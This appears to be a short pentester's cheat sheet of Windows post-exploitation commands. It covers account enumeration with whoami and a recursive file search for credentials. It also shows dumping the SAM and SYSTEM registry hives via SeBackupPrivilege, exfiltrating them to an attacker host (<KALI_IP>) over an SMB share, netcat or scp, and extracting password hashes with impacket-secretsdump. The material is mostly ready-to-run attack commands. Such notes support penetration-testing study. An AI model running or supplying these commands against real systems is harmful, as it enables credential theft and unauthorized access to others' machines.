
## Different Accounts
Definitely read this
https://chatgpt.com/share/6aa0f4f7-28cc-83ee-b612-acc42b69a2ab

always see the
```
whoami /user 
whoami /groups 
whoami /priv
```


There are different accounts
1) Local Accounts
2) Domain Accounts
3) EntraID Accounts

`Net User` or `Get-LocalUser` shows local accounts only

## Searching Commands

```
Get-ChildItem -Path C:\ -Include *.txt,*.log,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notlike 'C:\Windows\*' -and $_.FullName -notlike 'C:\Program Files\*' -and $_.FullName -notlike 'C:\Program Files (x86)\*' }
```

### To Decode UTF-16 LE
`$encoded = Get-Content .\install.ini | Select-Object -Skip 2 
`$bytes = [Convert]::FromBase64String($encoded) 
`[Text.Encoding]::Unicode.GetString($bytes)

## To get SAM and SYSTEM files if you have SeBackUpPriv

```
reg save hklm\sam sam
reg save hklm\system system
```

To get to it to local system
```
sudo impacket-smbserver share $(pwd) -smb2support

copy sam \\IP\share
copy system \\IP\share
```

Using nc
```
// In kali
nc -lvnp 9001 > sam.save

// In Windows
nc.exe <KALI_IP> 9001 < C:\Users\enterpriseuser\sam.save
```

using scp (if openssh is available)
```
scp C:\Users\enterpriseuser\sam.save kali@<KALI_IP>:/tmp/
```

To get the SAM hashes
```
impacket-secretsdump -sam sam -system system LOCAL
```


